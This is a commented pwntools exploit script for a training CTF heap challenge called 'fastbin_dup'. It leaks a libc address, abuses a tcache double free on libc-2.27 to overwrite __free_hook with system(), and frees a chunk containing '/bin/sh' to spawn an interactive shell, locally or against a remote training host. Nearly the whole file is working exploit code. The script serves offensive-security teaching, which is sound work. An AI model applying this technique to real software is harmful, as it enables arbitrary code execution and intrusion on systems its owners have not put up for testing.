from pwn import *

# A menu asks what to do: allocate a new chunk, write, read or free one. Here we can exploit the fact that the program does not check for a block to be freed twice.
# Here we exploit the first version of the T-cache (libc-2.27), which had no security checks except from heap alignment.

CHALL_PATH = "./fastbin_dup_patched"
CHALL = ELF(CHALL_PATH)
LIBC = ELF("/home/merk/odc/env/libc-2.27.so")
COMMANDS = """
b  main
c
"""

def alloc(c, size) :
    c.recvuntil(b"> ")
    c.sendline(b'1')
    c.recvuntil(b"Size: ")
    c.sendline(str(size).encode("utf-8"))
    line = c.recvline()
    index = int(line.split(b"index ")[1].split(b"!\n")[0])
    return index
    
def write(c, index, data) :
    c.recvuntil(b"> ")
    c.sendline(b'2')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))
    c.recvuntil(b"Content: ")
    c.send(data)    # here we are working with pointers, so sending a newline would break execution because '\n' would be saved instead of a valid address

def read(c, index) :
    c.recvuntil(b"> ")
    c.sendline(b'3')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))
    return c.recvline()

def free(c, index) :
    c.recvuntil(b"> ")
    c.sendline(b'4')
    c.recvuntil(b"Index: ")
    c.sendline(str(index).encode("utf-8"))

if args.REMOTE:
    c = remote("fastbin-dup.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, gdbscript = COMMANDS)
    else:
        c = process(CHALL_PATH)

# Leaking libc address
alloc(c, 0x500)     # Index 0 (going over the T-cache max size to have a bin bigger than a fastbin, if the progam limits the allocation size we have to go on allocating with an allowed size until the T-cache is full, that is, making a for loop)
alloc(c, 0x10)      # Index 1 (avoid the first chunk to be consolidated to the top chink)
free(c, 0)
LIBC.address = u64(read(c, 0).split(b"\n")[0].ljust(8, b"\x00")) - 0x3ebca0     # 0x3ebca0 is the difference between the address leaked with the read and the base address of the libc retrieved in gdb with vmmap
print(f"Libc address: {hex(LIBC.address)}")

alloc(c, 0x20)  # Index 2
alloc(c, 0x20)  # Index 3

free(c, 3)
free(c, 3)  # This way we have the next pointer pointing to its own chunk

alloc(c, 0x20)  # Index 4
write(c, 4, p64(LIBC.sym["__free_hook"]))    # Changing the pointer to what we need

alloc(c, 0x20)  # Index 5 to make our pointer the head of the list

# Allocating over the free_hook
alloc(c, 0x20)  #Index 6
write(c, 6, p64(LIBC.sym["system"]))

# Now we have to write "/bin/sh" in some chunk we don't use anymore, so when freeing it the free_hook (modified with teh pointer to the system) will be called with as a parameter the content of the chunk and so it will be called system("/bin/sh")
write(c, 5, b"/bin/sh\x00")
free(c, 5)

c.interactive()